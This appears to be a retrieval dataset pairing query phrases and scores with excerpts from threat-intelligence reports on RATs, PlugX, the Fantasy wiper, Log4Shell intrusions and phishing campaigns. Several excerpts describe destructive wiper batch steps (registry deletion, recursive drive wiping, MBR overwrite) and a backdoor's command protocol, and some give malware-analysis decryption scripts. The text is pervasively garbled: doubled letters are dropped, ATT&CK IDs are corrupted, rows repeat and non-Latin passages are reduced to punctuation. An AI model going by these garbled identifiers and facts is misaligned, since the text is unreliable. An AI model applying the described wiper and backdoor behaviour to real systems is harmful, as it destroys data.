Discovery present in a victims computer.']"
cfcfd781a4d12781c5f0b6a223e4cd99,used various RATs that can read the Registry.,0.753726756179303,"['Credential T15.03 Credentials from Pasword The atackers have used various RATs with modules that steal Aces Stores: Credentials from paswords saved in victim web browsers.', 'Web Browsers 14/15 Tactic ID Name Description Discovery T1010 Aplication Window The atackers have used dropers and RATs that gather information Discovery about opened windows.', 'T1083 File and Directory Discovery The atackers have used various RATs that can browse file systems.', 'T120 Peripheral Device Discovery The atackers have used njRAT, which atempts to detect if the victim system has a camera during the initial infection.', 'T1057 Proces Discovery The atackers have used various RATs with modules that show runing proceses.', 'T1012 Query Registry The atackers have used various RATs that can read the Registry.', 'T1018 Remote System Discovery The atackers have used njRAT, which can identify remote hosts on conected networks.', 'T1518.01 Software Discovery: Security The atackers have used dropers that check for security software Software Discovery present in a victims computer.', 'T1082 System Information The atackers have used various RATs that gather system information Discovery such as computer name and operating system during the initial infection.', 'T1016 System Network The atackers have used various RATs that can colect the IP adres Configuration Discovery of the victim machine.', 'T1049 System Network The atackers have used various RATs that can list network Conections Discovery conections on a victims computer.']"
cfcfd781a4d12781c5f0b6a223e4cd99,used various RATs that gather system information such as computer name and operating system during the initial infection,0.8721404852535801,"['T120 Peripheral Device Discovery The atackers have used njRAT, which atempts to detect if the victim system has a camera during the initial infection.', 'T1057 Proces Discovery The atackers have used various RATs with modules that show runing proceses.', 'T1012 Query Registry The atackers have used various RATs that can read the Registry.', 'T1018 Remote System Discovery The atackers have used njRAT, which can identify remote hosts on conected networks.', 'T1518.01 Software Discovery: Security The atackers have used dropers that check for security software Software Discovery present in a victims computer.', 'T1082 System Information The atackers have used various RATs that gather system information Discovery such as computer name and operating system during the initial infection.', 'T1016 System Network The atackers have used various RATs that can colect the IP adres Configuration Discovery of the victim machine.', 'T1049 System Network The atackers have used various RATs that can list network Conections Discovery conections on a victims computer.', 'T103 System Owner/User The atackers have used various RATs that retrieve the curent Discovery username during initial infection.', 'T107 System Service Discovery The atackers have used various RATs that have modules to manage services on the system.', 'T1021.01 Remote Services: Remote The atackers have used various RATs that can perform remote Desktop Protocol desktop aces.']"
6dbbddb14c0857ae5c7bf25efbfaa0c4,data exfiltration of sensitive information,0.9311990516110591,"['An in-depth code investigation and analysis wil highlight Hydraq features and capabilities, and as it unfolds, questions wil unravel on to whether the discovery of this threat is just the begining of a global arms race against cyberwar- fare.', 'Table of Contents Introduction 3 Anatomy of an Atack 4 1.', 'How Hackers Gain Aces 5 1.1 Reconaisance 5 1.2 0Day Hack Atack 5 1.3 MS10-02 (CVE-2010-049) Analysis 5 1.4 Hydraq Binary Shelcode 7 2.', 'How Hackers Maintain Aces 9 2.1 Win32/Hydraq (EXE) Droper: Generating Random Service 9 2.2 Win32/Hydraq (DL) Backdor: Method of Instalation 10 3.', 'Cyber Spy In Control 1 3.1 Initialization of the Backdor Configuration 1 3.2 Comand and Control 1 3.3 Backdor Configuration: Resource Section and Registry Key 12 3.4 Backdor Comunication Protocol 0x0: Establishing Comunication 13 3.5 Backdor Comunication Protocol 0x01: Execution of Client-Server Comands 17 3.6 Backdor Comand Reference 19 3.7 Backdor Comand Table 21 3.9 Backdor Comands In Action 24 Sumary 28 Safe Computing Habits 29 Apendix A - Other variant method of instalation 31 Apendix B - Initial Handshake 3 Apendix C - Customize Character Decoding 3 Apendix D - Real-time Graphical Control 35 Apendix E - Domain Name List 36 Reference 37 CA ISBU-ISI WHITE PAPER: IN-DEPTH ANALYSIS OF HYDRAQ 2 Introduction In mid-December, we detected a highly sophisticated and targeted atack on our corporate infrastructure originating from China that resulted in the theft of intelectual property from Gogle.', '.', 'we have evidence to sugest that a primary goal of the atackers was acesing the Gmail acounts of Chinese human rights activists.', 'This statement was taken from a Gogle blog post entitled ""A new aproach to China""[1], in which Gogle declared its decision to stop censoring its search results in China.', 'Internet fredom vs cyber crime is a dep isue that croses al boundaries; and the same brought global debate about internet censorship and human rights [2].', 'This incident prompted authorities and world leaders to discus and work on maters of cyber crime; taking into consideration that cyber threats may afect national security [3].', 'The report Tracking GhostNet: Investigating a Cyber Espionage Network [4] as published last year, highlights cyberwarfare as a major global concern.']"
cae33c8970a53857dff6608fe8894b8a,runs a scheduled task,0.8016251359320516,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
ce06e9983253a40a71827e5dd84e4f2c,It contains Base64-encoded data,0.7971126585009438,"['ESET Research White Paper / May 2020 FROM AGENT.BTZ TO COMRAT V4 A ten-year journey Mathieu Faou TABLE OF CONTENTS 1.', 'Executive Sumary .', '.', '.', '.', '.', '.', '.']"
ce06e9983253a40a71827e5dd84e4f2c,It contains Base64-encoded data,0.7971126585009438,"['ESET Research White Paper / May 2020 FROM AGENT.BTZ TO COMRAT V4 A ten-year journey Mathieu Faou TABLE OF CONTENTS 1.', 'Executive Sumary .', '.', '.', '.', '.', '.', '.']"
6ff1e8620487eac946600e0b2ab3defd,the UPX packed sample,0.8263922626655268,"['8 8 Operating Routine of Discovered Malware Samples BackDor.PlugX.93 Aded to the Dr.Web virus database: 2021-10-2 Virus description aded: 2021-10-30 Packer: absent Compilation date: 2020-08-13 SHA1 hash: a8bf9e1ea76d3de60fdbd78ad04f81a8c659 Description The PlugX backdor module is writen in C. Its designed to decrypt the shelcode from the registry that loads the main backdor into memory.', 'Operating principle First, the backdor receives the adres of the VirtualProtect() function by hash.', 'It then uses this adres to change aces rights to PAGE_EXECUTE_READWRITE, starting from the function at 0x1010 and ending with the entire .text section: Geting the functions adres by the hash pased as a parameter: 9 9 Script to get a function by hash: import pefile ror = lambda val, r_bits, max_bits: \\ 10 10 (val & (2*max_bits-1) > r_bits%max_bits) | \\ (val < (max_bits-(r_bits%max_bits) & (2*max_bits-1) max_bits = 32 library_path_list = [.]', ""# absolute path dls def get_func_adr(hash): for library_path in library_path_list: library = library_path.split('\\') name_dl = library[len(library) - 1].uper() + b'\\x0' hash_name_dl = 0 for i in name_dl: hash_name_dl = ord(i) + ror(hash_name_dl, 0x0D, max_bits) hash_name_dl = 0 + ror(hash_name_dl, 0x0D, max_bits) pe = pefile.PE(library_path) for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: func_name = exp.name + b'\\x0' hash_name_func = 0 for i in func_name: hash_name_func = ord(i) + ror(hash_name_func, 0x0D, max_bits) if (hash_name_dl + hash_name_func = hash): print '{}-> 0x{:08x} -> {}'.format(name_dl, hash, exp.name) return Changing the permisions to PAGE_EXECUTE_READWRITE was necesary to decrypt the code using the XOR operation: 1 1 One version of the backdor has dynamic XOR encryption."", 'It has decryption at the begining of the function: And with encryption at the end of the function: 12 12 Facilitating the scripts work for IDAPython: import idapi def xor_dec(adres, count, key): for i in xrange(count): idapi.patch_dword(adres, idapi.get_dword(adres) ^ key) key += idapi.get_dword(adres) adres += 4 Before performing malicious actions, the backdor, as in the case of VirtualProtect(), receives functions adreses that it neds to work 13 13 Received features: Function name Hash CloseHandle 0x528796C6 CreateFileA 0x4FDAF6DA DeleteFileA 0x13D2ED7 ExitProces 0x56A2B5F0 GetAdaptersInfo 0x62C9E1BD GetModuleFileNameA 0xFE6145D GetSystemDirectoryA 0x60BCDE05 LoadLibraryA 0x72674C ReadFile 0xB5F9EAD 14 14 Function name Hash RegCloseKey 0x81C2AC4 RegDeleteValueA 0x3846A3A8 RegEnumValueA 0x2EC95A4 RegOpenKeyExA 0x3E9E3F8 RegQueryValueExA 0x8F0E305 VirtualAloc 0xE53A458 VirtualFre 0x30F2F0B VirtualProtect 0xC38AE10 WinExec 0x876F8B31 WriteFile 0x5BAE572D In adition, the backdor checks if it is executed in a sandbox: 15 15 After receiving the function adreses and checking for execution in the sandbox, BackDor.PlugX.93 removes the updatecfgSetup task from the task scheduler: The key for shelcode encryption is MD5 from the folowing registry key values: 16 16 HKLM\\Software\\Microsoft\\Windows NT\\CurentVersion\\InstalDate HKLM\\System\\ControlSet01\\Control\\ComputerName\\ComputerName The shelcode is stored in the folowing registry keys: HKLM\\Software\\BINARY HKCU\\Software\\BINARY 17 17 Before runing the shelcode, itl be decrypted in 2 steps: first, using the RC4 algorithm: then, with XOR: 18 18 BackDor.Sigen2.362 Aded to the Dr.Web virus database: 2021-1-03 Virus description aded: 2021-x-x Packer: UPX SHA1 hash: be4d83469f73e9620b9060fd87bc519a05617a Description A backdor writen in Go.', 'Its packed by UPX.', 'Investigated backdor version V2.5.5 z 2021.7.19.', 'Operating principle In the begining, the malicious code checks if another backdor copy is runing.', 'The trojan checks for the c:\\windows\\inf\\mdmslbv.inf file.', 'If it exists, the trojan starts reading.', ""You can use the folowing script to decrypt: import sys with open(sys.argv[1], 'rb') as f: d = f.read() s = bytearay() for i in range(len(d): s.apend(d[i]) for i in range(len(s)-2, 0, -1): s[i] = (s[i + 1] * s[i + 1]) ^ s[i]) & 0xf) with open(sys.argv[1] + '.dec', 'wb') as f: f.write(s) Encrypted files length The packets structure: 19 19 random string from 10 to 19 characters long betwen the <a>.</a> tags contains the backdor proces PID betwen the <b>.</b> tags is the proces name random string from 10 to 19 characters long The trojan checks for the existence of a proces with the specified parameters.""]"
7607a101fda17219c8a6cbc34de42baa,brute forcing,0.7509168829320207,"['16 Persistence .', '16 System fingerprinting .', '19 Predecesor: c2.bat .', '19 Pre-predecesor: c.bat .', '20 Initial infection vector .', '21 SQL server brute forcing .', '21 SQL comand colection .', '2 SQL brute forcer .', '23 EternalBlue spreader .', '28 Payloads .', '32 PCShare .']"
7607a101fda17219c8a6cbc34de42baa,brute forcing,0.7509168829320207,"['16 Persistence .', '16 System fingerprinting .', '19 Predecesor: c2.bat .', '19 Pre-predecesor: c.bat .', '20 Initial infection vector .', '21 SQL server brute forcing .', '21 SQL comand colection .', '2 SQL brute forcer .', '23 EternalBlue spreader .', '28 Payloads .', '32 PCShare .']"
aa3c3157a2336623d96a7e2fa57fec02,brute forcing,0.8281803052702272,"['6 2.2 IP ranges .', '7 2.3 Working hours .', '7 3 Poison Ivy .', '8 3.1 Description .', '8 3.2 Remote code execution vulnerability.', '8 3.3 Encryption key brute forcing .', '8 3.4 Exploitation .', '9 3.5 Shelcode .', '1 4 Information obtained on the C&C .', '12 4.1 Infrastructure schema.', '12 4.2 Tols .']"
aa3c3157a2336623d96a7e2fa57fec02,brute forcing,0.8281803052702272,"['6 2.2 IP ranges .', '7 2.3 Working hours .', '7 3 Poison Ivy .', '8 3.1 Description .', '8 3.2 Remote code execution vulnerability.', '8 3.3 Encryption key brute forcing .', '8 3.4 Exploitation .', '9 3.5 Shelcode .', '1 4 Information obtained on the C&C .', '12 4.1 Infrastructure schema.', '12 4.2 Tols .']"
3d2e99ba94188b71a17364073a49e3ea,The batch file,0.7514180536353627,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
3d2e99ba94188b71a17364073a49e3ea,a batch file,0.7657437517555142,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
3d2e99ba94188b71a17364073a49e3ea,"creates another batch file, system.bat,",0.7518563220819865,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
7825234106c25d7d6d51def428f95754,then deletes the file.,0.7579979205925732,"['stdout and stder are redirected to a string and the content of the string wil be sent to the C&C.', 'If the file to be executed does not exists it sends back to the C&C 01|file 2|url|file Downloads the file from url and writes it with the name file.', 'Returns to the C&C 020|file if the file was sucesfuly writen, 021|file if the file was not writen or 051|url|erCode if the download failed.', '3|file Searches the file file and sends it to the C&C.', 'In case of an eror it wil return 034|file if the file is a folder, 03|file|size if the file size is greater than 50 bytes, 031|file if the file exists but it couldnt get information about it, 032|file if the file does not exists, 051|url|erCode if the file could not be sent due to some network problems.', '4|file Deletes the file file.', 'Returns to the C&C 040|file if the file was deleted or 041|file if the file could not be deleted.', '5|string1|file Sends back string1 to the C&C.', 'The C&C responds with a bufer which wil be writen to the file file.', 'It sends back to the C&C 020|file if the file was sucesfuly writen, 021|file if the file could not be writen or 051|url|erCode in case of network problems.', '6|path|depth Lists files and directories from path recursively until depth level, then it sends the list to the C&C.']"
7825234106c25d7d6d51def428f95754,then deletes the file.,0.7579979205925732,"['stdout and stder are redirected to a string and the content of the string wil be sent to the C&C.', 'If the file to be executed does not exists it sends back to the C&C 01|file 2|url|file Downloads the file from url and writes it with the name file.', 'Returns to the C&C 020|file if the file was sucesfuly writen, 021|file if the file was not writen or 051|url|erCode if the download failed.', '3|file Searches the file file and sends it to the C&C.', 'In case of an eror it wil return 034|file if the file is a folder, 03|file|size if the file size is greater than 50 bytes, 031|file if the file exists but it couldnt get information about it, 032|file if the file does not exists, 051|url|erCode if the file could not be sent due to some network problems.', '4|file Deletes the file file.', 'Returns to the C&C 040|file if the file was deleted or 041|file if the file could not be deleted.', '5|string1|file Sends back string1 to the C&C.', 'The C&C responds with a bufer which wil be writen to the file file.', 'It sends back to the C&C 020|file if the file was sucesfuly writen, 021|file if the file could not be writen or 051|url|erCode in case of network problems.', '6|path|depth Lists files and directories from path recursively until depth level, then it sends the list to the C&C.']"
6677947abc04744dbb9c9741a9e7cbd5,It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.,0.8398822483600777,"['However, the Fantasy wiper only loks for an argument of 41 and ignores al other runtime input (se the next section for more information).', 'Fantasy wiper 3/10 The Fantasy wiper is also a 32-bit Windows executable writen in C#/.NET, so named for its filenames: fantasy45.exe and fantasy35.exe, respectively.', 'Figure 3 depicts the execution flow of the Fantasy wiper.', '4/10 Figure 3.', 'Fantasy wiper execution flow Initialy, Fantasy creates a mutex to ensure that only one instance is runing.', 'It colects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.', 'Then it enters a for lop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.GetBytes method to create a cryptographicaly strong sequence of random values in a 4096-byte aray.', 'If a runtime argument of 41 is suplied to the wiper, the for lop overwrites the contents of every file with the aforementioned byte aray using a nested while lop.', 'Otherwise, the for lop only overwrites files with a file extension listed in the Apendix.', 'Fantasy then asigns a specific timestamp (2037-01-01 0:0:0) to these file timestamp properties: CreationTime LastAcesTime LastWriteTime CreationTimeUtc SetLastAcesTimeUtc LastWriteTimeUtc and then deletes the file.', 'This is presumably done to make recovery and forensic analysis more dificult.']"
263142ff9b483ce38017d7e3b2de044d,Recursive directory listing functions,0.7704262638248685,"['Decompresion After decryption, the payload is decompresed recursively using GZip.', 'Once the Comand and Forward variables are extracted, they are used by the malware to launch the requested built-in functionality.', 'The first byte of the Comand parameter (Comand ID) is used to determine which built-in function wil be executed by the malware.', 'In most cases, the Forward data wil contain the arguments for the requested function, but in some cases, the selected functionality wil not require both variables and only the Comand variable is resolved.', 'The built-in functionalities of the NodeISWeb malware can be sen in the folowing table: Comand ID Description 0x0 Information gathering - Query domain membership, operation system information, proces and owner information of the curent proces, time zone, network interfaces information and status and drives information.', '0x01 Recursive directory listing.', '0x02 File reading.', '0x03 File writing.', '0x04 Copying or moving files, or recursively copying directories.', '0x05 files and recursive directories deletion.', '0x06 Directory creation.']"
6677947abc04744dbb9c9741a9e7cbd5,that deletes the Fantasy wiper from disk and then deletes itself.,0.7813700844254962,"['File wiping then resumes in the next directory in the target list.', 'Once the for lop completes, the Fantasy wiper creates a batch file in %WINDOWS%\\Temp caled registry.bat.', 'The batch file deletes the folowing registry keys: HKCR\\.EXE HKCR\\.dl HKCR\\* Then it runs the folowing to atempt to clear file system cache memory: %windir%\\system32\\rundl32.exe advapi32.dl,ProcesIdleTasks Lastly, registry.bat deletes itself (del %0).', 'Next, the Fantasy wiper clears al Windows event logs and creates another batch file, system.bat, in %WINDOWS%\\Temp, that recursively deletes al files on %SYSTEMDRIVE%, atempts to clear file system cache memory, and self-deletes.', 'Then Fantasy sleps for two minutes before overwriting the systems Master Bot Record.', 'Fantasy then writes another batch file, %WINDOWS%\\Temp\\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.', 'Then Fantasy wiper sleps for 30 seconds before reboting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x0) Other isue.', 'It is likely that %SYSTEMDRIVE% recovery is posible.', 'Victims were observed to be back up and runing within a mater of hours.', 'Atribution to Agrius Much of the code base from Apostle, initialy a wiper masquerading as ransomware then updated to actual ransomware, was directly copied to Fantasy and many other functions in Fantasy were only slightly modified from Apostle, a known Agrius tol.', 'However, the overal functionality of Fantasy is that of a wiper without any atempt to masquerade as ransomware.']"
f35c22043263d414403f1c3e0219fb06,The Scheduled Task was named  to masquerade as a legitimate Windows task.,0.8248421744933647,"['file.zip contained XMRig cryptocurency mining software and asociated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Asociated file.', 'This file can create a local user acount [T136.01] and tests for internet conectivity by pinging 8.8.8.8 [T1016.01].', 'The exploit payload created a Scheduled Task [T1053.05] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shel, the actors gained aces to a VMware service acount with administrator and system level aces.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.', 'Se MAR 10387061-1.v1 for aditional information, including IOCs, on these four files.', 'After obtaining initial aces and instaling XMRig on the VMWare Horizon server, the actors used RDP [T1021.01] and the built-in Windows user acount DefaultAcount [T1078.01] to move lateraly [TA08] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server asociated with 14.76.136[.]153.', 'The actors downloaded the folowing tols: PsExec a Microsoft signed tol for system administrators.']"
f35c22043263d414403f1c3e0219fb06,the actors leveraged RDP to propagate to several hosts within the network.,0.853934506371565,"['Mimikatz a credential theft tol.', 'Ngrok a reverse proxy tol for proxying an internal service out onto an Ngrok domain, which the user can then aces at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tol in use by some comercial products for benign purposes; however, this proces bypases typical firewal controls and may be a potentialy unwanted aplication in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator acount [T136.02].', 'Using the newly created acount, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon loging into each host, the actors manualy disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose aces to a machine during a routine rebot.', 'The actors were able to proxy [T1090] RDP sesions, which were only observable on the local network as outgoing HTPS port 43 conections to tunel.us.ngrok[.', ']com and korgn.su.lenut[.', ']com Page 3 o f 14 | Product ID: A2-320A TLP:CLEAR TLP:CLEAR CISA | FBI ` (the prior domain in reverse).']"
f35c22043263d414403f1c3e0219fb06,The threat actors then executed Mimikatz on VDI-KMS to harvest credentials,0.7698075711497729,"['Test your technologies against the technique.', '4.', 'Analyze your detection and prevention technologies performance.', '5.', 'Repeat the proces for al security technologies to obtain a set of comprehensive performance data.', '6.', 'Tune your security program, including people, proceses, and technologies, based on the data generated by this proces.', 'CISA and FBI recomend continualy testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE AT&CK techniques identified in this advisory.', 'REFERENCES [1] MITRE AT&CK Version 12: Software Ngrok Page 14 of 14 | Product ID: A2-320A TLP:CLEAR']"
01be204435044a83ae8553bc754a2b98,The actors used Mimikatz,0.7523682809591304,"['2013 CVE-2013-063 CVE- 2013-0634 (Ladyboyle)1.23 2016 4 (Symantec) (Tick) 4, 1 LAC .5 2017 6 (SecureWorks) (Bronze Butler)6 , 7 7 1 8 .', '2018 6 42 USB .9 2014 .', '208 .', 'IT .', ', USB .', '.', '.', '1 htps:/w.symantec.com/conect/blogs/adobe-zero-day-used-ladyboyle-atack 2 htps:/w.fireye.com/blog/threat-research/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html 3 htps:/asec.ahnlab.com/912 4 htps:/w.symantec.com/conect/blogs/tick-cyberespionage-group-zeros-japan 5 htps:/w.lac.co.jp/english/report/2016/1/04_cgview_01.html 6 htps:/w.secureworks.com/research/bronze-butler-targets-japanese-busineses 7 htps:/unit42.paloaltonetworks.com/unit42-tick-group-continues-atacks/ 8 htps:/blog.trendmicro.com/trendlabs-security-inteligence/redbaldknight-bronze-butler-daserf-backdor-now-using- steganography/ 9 htps:/unit42.paloaltonetworks.com/unit42-tick-group-weaponized-secure-usb-drives-target-air-gaped-critical-systems/ AhnLab, Inc. Al rights reserved.', '3 Analysis Report_Tick Group 2014 .', ', , , , , , , IT .', ', MS , .']"
d5019121cbc645eb0787efab173a12b3,The actors used Mimikatz,0.7523682809591304,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,The actors used Mimikatz,0.7523682809591304,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
22dd2ea3699b3fe979833e4c855902cf,phishing email,1.0,"['Joint advisory by: Military Counterinteligence Service & CERT.PL QUARTERIG Malware Analysis Report 13 April 2023 v1.0 Military Counterinteligence Service CERT.PL Table of Contents Table of Contents .', '2 Threat Sumary .', '3 Detailed Technical Analysis .', '5 Delivery .', '5 Phishing Email .', '5 Container File .6 1st Stage - Initial DL hijacker.dl .', '7 2nd Stage - Shelcode DL Loader .', '10 3rd Stage Intermediate Shelcode Loader runer.dl .', '1 4th Stage Shelcode Droper Loader .', '14 5th Stage Payload Droper .']"
6d09eaa9b70d39e6bd4c12a4853e8354,phishing email,0.8395011722985459,"['30 Genians Security Center 1 Threat Inteligence Report (Executive Sumary) (LiNK) Browser In The Browser(BitB) Single Sign-On (SO) , APT37 01.', '(Overview) a.', '(Threat Hunting) 7 24 ( GSC) .', 'GSC .', ""[LiNK : Liberty in North Korea] ' ."", '.', ', 7 26 24 2 .', '60 50 12 .', '.', ', .', '.']"
399d345299273d1e60281ea057aaff0c,login credentials,0.7592594748669064,"['We also se that the comand was run under the user r_flores_admin.', '181 eht rof tneve daolnwoD .5 erugiF exe.detcirtserkrowtensysl elfi Our focus now is the user r_flores_admin.', 'We perform the same trick as before, that is, analyze where, how, and when the login was made under this user.', 'It turns out that it was again an RDP sesion from the host rdg.hv-logistivs.stf (10.156.26.21).', ""But let's not race ahead."", 'Before investigating what hapened on this host, we first take a lok at the actual login.', 'From this event, we can extract extremely useful information: the sesion ID.', 'This wil alow us to colect al user activity related to this RDP sesion, which can help with incident response.', 'We can lok at the proceses runing within the sesion, and find posible artifacts of atacker activity and potential ways to gain persistence in the system.', 'Figure 6.', 'Instaling a service on comp-54.hv- logistics.stf (10.156.2.25) to elevate privileges and gain persistence in the system During this sesion, as we discovered, Because atackers sometimes forget (or are r_flores_admin created a service with the execut- to lazy) to change this line, it can be a great able file WIHost.exe to elevate their privileges indicator of using Impacket smbexec.']"
140a251a28ed9d344ca95059dba252f7,login credentials,0.7509209579897177,"['As we noted then, these incidents stod out because they exceded the level of care and preparation sen in the everyday cybercrime.', 'In our report, we also noted a similarity to the Operation Kingphish (htp:/medium.com/amnesty-insights/operation-kingphish- uncovering-a-campaign-of-cyber-atacks-against-civil-society-in-qatar-and-a40c9e0852) campaign published by Amnesty International earlier this year.', 'As we wrote then, compared to Kingphish, Bahamut operates as though it were a generation ahead in terms of profesionalism and ambition.', 'A more recent credential theft atempt provided the most credible link betwen the two campaigns thus far, and bolsters our hypothesis that the operations are related.', 'Among a flury of spearphishing atempts asociated with Bahamut in recent weks, one fake Gogle mesage directed its target to a unique domain (string2port[.', ']com) to steal login credentials.', 'The string2port domain (registered in May 2016) strongly reflects the ping2port[.', ']info domain (registered in September 2016) that was used in Kingphish against Qatar-focused labor rights advocates.', 'The ping2port domain is now pending deletion abandoned due to discovery but the previously unoticed and related string2port has ben reused.', 'Given the similarities in tactics, administration of infrastructure, domains, and other factors, it apears increasingly clear both campaigns against Midle Eastern diplomats and those directed against human rights advocates are conected.', 'The similarities to other research is not limited to Kingphish, and includes a prolific campaign in South Asia.']"
140a251a28ed9d344ca95059dba252f7,login credentials,0.7509209579897177,"['As we noted then, these incidents stod out because they exceded the level of care and preparation sen in the everyday cybercrime.', 'In our report, we also noted a similarity to the Operation Kingphish (htp:/medium.com/amnesty-insights/operation-kingphish- uncovering-a-campaign-of-cyber-atacks-against-civil-society-in-qatar-and-a40c9e0852) campaign published by Amnesty International earlier this year.', 'As we wrote then, compared to Kingphish, Bahamut operates as though it were a generation ahead in terms of profesionalism and ambition.', 'A more recent credential theft atempt provided the most credible link betwen the two campaigns thus far, and bolsters our hypothesis that the operations are related.', 'Among a flury of spearphishing atempts asociated with Bahamut in recent weks, one fake Gogle mesage directed its target to a unique domain (string2port[.', ']com) to steal login credentials.', 'The string2port domain (registered in May 2016) strongly reflects the ping2port[.', ']info domain (registered in September 2016) that was used in Kingphish against Qatar-focused labor rights advocates.', 'The ping2port domain is now pending deletion abandoned due to discovery but the previously unoticed and related string2port has ben reused.', 'Given the similarities in tactics, administration of infrastructure, domains, and other factors, it apears increasingly clear both campaigns against Midle Eastern diplomats and those directed against human rights advocates are conected.', 'The similarities to other research is not limited to Kingphish, and includes a prolific campaign in South Asia.']"
